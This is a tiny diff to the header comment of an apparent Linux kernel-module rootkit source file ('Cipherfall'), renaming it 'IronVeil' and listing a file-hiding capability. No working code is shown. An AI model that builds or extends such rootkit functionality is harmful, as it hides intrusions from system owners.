@@ -1,5 +1,5 @@
 /*
- * rootkit.c — Cipherfall LKM Rootkit
+ * IronVeil (rootkit.c) — Cipherfall LKM Rootkit
  *
  * Capabilities:
  *   - Hides files and directories whose names start with HIDE_FILE_PREFIX
